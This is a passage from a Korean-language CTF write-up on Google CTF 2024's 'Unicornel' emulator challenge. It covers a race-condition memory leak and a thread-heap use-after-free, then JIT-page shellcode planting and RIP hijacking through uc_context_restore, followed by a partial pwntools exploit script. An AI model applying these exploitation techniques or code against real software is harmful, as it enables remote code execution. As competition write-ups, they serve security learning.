</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;mov rsp, 0x2000</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;retry:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> create_shared_x86(<span style="color:#ae81ff">0x1000</span>)
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> resume_x86(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> pause_x86()
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> map_shared_x86(<span style="color:#ae81ff">0x5000</span>, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0</span>) <span style="color:#75715e"># handle 0</span>
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">mov rdi, 0x5000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov rax, [rdi]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cmp rax, 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">jne success
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span></code></pre></div><p>그리고 위와 같이 따로 판별 로직을 추가해서 race의 성공, 실패 여부를 판별하고 이를 통해 안정적으로 메모리를 유출할 수 있다.</p>
<p><img loading="lazy" src="/blog/Google_CTF_2024_Unicornel/c23b083d968f9edf9555ef8e1dac1dcb.png" alt=""  />

위와 같은 메모리 레이아웃을 가지는데, 여기서 rwx로 매핑된 JIT page를 발견할 수 있었고, 이러한 JIT page는 자체적인 랜덤화가 적용된 것으로 보이며 성공적인 RCE를 위해서 JIT page를 타겟팅하기로 결정했다.</p>
<h3 id="initial-attempt">Initial Attempt<a hidden class="anchor" aria-hidden="true" href="#initial-attempt">#</a></h3>
<p>처음 시도했던 시나리오는 다음과 같다.
쓰레드 힙에서의 UAF를 통해 쓰레드 힙 주소를 유출했을때 JIT page는 엔트로피가 생각보다 적어 정확한 base를 유출할 수는 없지만 rwx 페이지 자체를 확률적으로 구할 수 있다.
이 방법으로 공격을 시도하려면 UAF를 통해 fd를 조작하고 tache에서 AAW를 달성해 JIT page에 청크를 할당해 악의적인 쉘코드를 작성하는 방식으로 공격을 시도해야한다.
사용자가 메모리를 마음대로 할당만 가능하다면, 후속 할당은 free된 메모리의 일부가 reclaim 되는 방식으로 메모리가 할당되기 때문에 fd를 변조하여 연결리스트를 오염시킬 수 있다.</p>
<p>위 시나리오는 사용자가 마음대로 메모리를 할당할 수 있어야만 가능한 시나리오였고 일반적인 방법으로는 메모리를 두 번이상 연속적으로 할당이 불가능했다.</p>
<h3 id="final-exploit-scenario">Final Exploit Scenario<a hidden class="anchor" aria-hidden="true" href="#final-exploit-scenario">#</a></h3>
<p>그래서 다른 시나리오를 생각해보기로 했다.
다음과 같은 가설을 세웠다.</p>
<p>JIT page가 있다는 것은 내부적인 최적화를 통해 에뮬레이션하는 코드 일부가 JIT을 통해 기계어로 변환된다는 얘기다.
이러한 JIT compile이 트리거되는 조건은 정확히 모르지만, 일반적으로 call count 같이 연속적으로 같은 코드를 실행시켜 이러한 JIT compile을 트리거할 수 있을 것이라고 생각했다.
이를 통해 유저의 입력을 JIT에 반영시킬 수 있게 만들 수 있을 것이라고 생각했고, 특정 아키텍처에서 지원하는 상수 로드를 명령을 이용해서 쉘 코드를 rwx에 일부 삽입하고 rip를 하이재킹한다면 쉘을 띄울 수 있을 것이라고 생각했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>x86_code <span style="color:#f92672">=</span> write_x86(<span style="color:#ae81ff">0x3000</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>x86_code <span style="color:#f92672">+=</span> resume_x86(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>x86_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">mov rdi, 0x200
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">call go
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">go:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movq r10, 0xdeadbeefdeadbeef
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movq r10, 0xdeadbeefdeadbeef
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    sub rdi, 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cmp rdi, 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    je out
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    jmp go
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">out:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ret
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span></code></pre></div><p>위 방식으로 코드를 일부러 최적화시켰더니 일종의 dead code elimination 같은 최적화를 내부적으로 진행하는 것으로 보였다.
가장 마지막 r10에 대한 대입 코드가 기계어로 변환되었고 0xdeadbeefdeadbeef가 JIT page에 들어간 것을 확인했다.
다른 아키텍처에선 최적화가 진행되었을때 JIT page에 8바이트를 반영시킬 수 없어서 x86_64에서 최적화를 시켜야한다.</p>
<p>이 시나리오를 이용하기 위해서는 다음과 같은 전제 조건이 만족되어야한다.</p>
<ul>
<li>JIT base를 정확하게 계산할 수 있어야한다. - 즉 JIT page를 정확하게 leak 할 수 있는 primitive가 필요하다.</li>
<li>RIP hijacking primitive가 필요하다.</li>
</ul>
<h3 id="jit-base-leak">JIT base leak<a hidden class="anchor" aria-hidden="true" href="#jit-base-leak">#</a></h3>
<p>쓰레드 힙에서 특정 사이즈를 충족시켜 이미 free 된 메모리에서 JIT을 가리키는 청크를 reclaim 할 수 있다면 성공적인 leak primitive를 만들 수 있다.
특정 컨디션에서 성공적으로 JIT base + 0x720을 릭할 수 있었다.</p>
<h3 id="hijacking-rip">Hijacking RIP<a hidden class="anchor" aria-hidden="true" href="#hijacking-rip">#</a></h3>
<p>유저가 컨트롤 가능한 방식에서 추가적인 악용 가능한 포인트를 찾아야 했다.
무조건 메모리 취약점이 발생한 쓰레드 내에서의 할당이 있어야 그 객체를 타겟으로 조작을 진행할 수 있기 때문이다.
가장 매력적인 포인트는 에뮬레이팅된 시스템콜 인터페이스이다.</p>
<p>시스템 콜 인터페이스 내부 unicorn engine의 구현중 uc_context_restore 에서 객체가 오염되었을 때 악용가능한 포인트를 찾을 수 있었다.
<img loading="lazy" src="/blog/Google_CTF_2024_Unicornel/08cb4545dff6ed4b7dc1570ad694b232.png" alt=""  />

<img loading="lazy" src="/blog/Google_CTF_2024_Unicornel/351ecfa76e41bc678d84fb151cca9be2.png" alt=""  />

context save 과정에서 동적으로 길이가 결정된다.
<img loading="lazy" src="/blog/Google_CTF_2024_Unicornel/c5ae85795567e1ee471e5bad6caeb265.png" alt=""  />

<img loading="lazy" src="/blog/Google_CTF_2024_Unicornel/a3324f643358726044325233e04ad485.png" alt=""  />

여기서 a1 + 384는 main heap에서 할당된 unicorn 엔진의 객체이다.
근데 여기서 a2는 보다시피 취약점이 발생한 쓰레드 힙이다.</p>
<p>그렇다면 공격 면적을 좀 더 넓힐 수 있다.
단순히 쓰레드 힙의 내부 객체를 조작함으로써 메인 힙에서 오버플로우를 발생시킬 수 있고 이를 통해 메인 힙의 객체를 오염시킬 수 있게 되었다.
<img loading="lazy" src="/blog/Google_CTF_2024_Unicornel/d822b10328d9d68d0a4544194a329a6c.png" alt=""  />

cpu_exec_x86_64 내부에선 다음과 같이 함수 포인터를 호출하기에 특정 조건을 맞춰서 객체를 조작하면 위와 같이 RIP를 하이재킹 할 수 있었다.</p>
<h2 id="exploit-code">Exploit code<a hidden class="anchor" aria-hidden="true" href="#exploit-code">#</a></h2>
<p><img loading="lazy" src="/blog/Google_CTF_2024_Unicornel/d0759c7ef16b792baf3d39fa49609119.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>UC_ARCH_ARM <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>UC_ARCH_ARM64 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>   
</span></span><span style="display:flex;"><span>UC_ARCH_MIPS <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>    
</span></span><span style="display:flex;"><span>UC_ARCH_X86 <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>     
</span></span><span style="display:flex;"><span>UC_ARCH_PPC <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>   
</span></span><span style="display:flex;"><span>UC_ARCH_SPARC <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span> 
</span></span><span style="display:flex;"><span>UC_ARCH_M68K <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>UC_ARCH_RISCV <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>UC_ARCH_S390X <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>UC_ARCH_TRICORE <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>UC_ARCH_MAX <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span>
</span></span><span style="display:flex;"><span>UC_MODE_16 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>UC_MODE_32 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>UC_MODE_64 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>UC_MODE_ARM <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>UC_MODE_BIG_ENDIAN <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">30</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">asm_x86_64</span>(assembly_code):
</span></span><span style="display:flex;"><span>    ks <span style="color:#f92672">=</span> Ks(KS_ARCH_X86, KS_MODE_64)
</span></span><span style="display:flex;"><span>    encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(assembly_code)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(bytes([b]) <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> encoding)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">asm_aarch64</span>(assembly_code):
</span></span><span style="display:flex;"><span>    ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
</span></span><span style="display:flex;"><span>    encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(assembly_code)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(bytes([b]) <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> encoding)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">asm_arm</span>(assembly_code):
</span></span><span style="display:flex;"><span>    ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM, KS_MODE_ARM)
</span></span><span style="display:flex;"><span>    encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(assembly_code)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(bytes([b]) <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> encoding)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">SEND_ELF</span>(ARCH, MODE, code_length):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32(ARCH)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32(MODE)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x1000</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x2000</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x1000</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x3000</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x1000</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x1000</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p16(code_length)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>unicornel_exit <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>unicornel_write <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>print_integer <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>create_shared <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>map_shared <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>unmap_shared <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>bookmark <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>unicornel_rewind <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>switch_arch <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>unicornel_pause <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>unicornel_resume <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_x86</span>(addr, count):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>unicornel_write<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rbx, </span><span style="color:#e6db74">{</span>addr<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{</span>count<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_str_x86</span>(string):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> shellcraft<span style="color:#f92672">.</span>pushstr(string) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>unicornel_write<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rbx, rsp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{</span>len(string)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pause_x86</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>unicornel_pause<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_return_value_x86</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov rbx, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>print_integer<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_shared_x86</span>(length):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>create_shared<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rbx, </span><span style="color:#e6db74">{</span>length<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">map_shared_x86</span>(address, length, handle):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>map_shared<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rbx, </span><span style="color:#e6db74">{</span>address<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{</span>length<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, </span><span style="color:#e6db74">{</span>handle<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unmap_shared_x86</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>unmap_shared<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">resume_x86</span>(pid):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov rbx, </span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>unicornel_resume<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rewind_x86</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>unicornel_rewind<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">save_ctx_x86</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, </span><span style="color:#e6db74">{</span>bookmark<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    int 0x80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pause_aarch64</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #</span><span style="color:#e6db74">{</span>unicornel_pause<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">resume_aarch64</span>(pid):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #</span><span style="color:#e6db74">{</span>unicornel_resume<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">save_ctx_aarch64</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #</span><span style="color:#e6db74">{</span>bookmark<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">map_shared_aarch64</span>(address, length, handle):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #</span><span style="color:#e6db74">{</span>map_shared<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #</span><span style="color:#e6db74">{</span>address<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #</span><span style="color:#e6db74">{</span>length<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x3, #</span><span style="color:#e6db74">{</span>handle<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_return_value_aarch64</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x0  
